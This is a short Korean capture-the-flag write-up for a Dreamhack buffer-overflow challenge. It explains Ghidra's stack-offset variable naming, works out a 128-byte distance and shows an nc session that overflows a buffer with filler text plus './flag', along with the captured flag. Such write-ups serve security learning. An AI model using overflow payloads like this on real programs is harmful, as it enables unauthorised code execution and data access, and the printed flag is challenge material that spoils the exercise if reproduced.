---
slug: "bof"
title: "bof"
date: 2026-04-27
category: "시스템해킹"
section: "wargame"
tags: []
excerpt: "기드라가 스택 변수 이름을 `local_XX` 형식으로 붙이는데, **XX가 스택 오프셋**임"
readingTime: 1
---

기드라가 스택 변수 이름을 `local_XX` 형식으로 붙이는데, **XX가 스택 오프셋**임

- `local_98` → 스택에서 -0x98 위치, 128바이트
- `local_18` → 스택에서 -0x18 위치

**거리 계산:**

```
0x98 - 0x18 = 0x80 = 128바이트
```

~~~ bash
 /Volumes/b/D/9/deploy  nc host8.dreamhack.games 20099
meow? fdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsadsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsa./flag

DH{5cd1f793ae6a081e4bfd28f6d570d83355148245fbe7c1f69b12771202b80a13}

meow, fdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsadsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafdsafda./flag :)
~~~
다음부턴 자동화 할 것
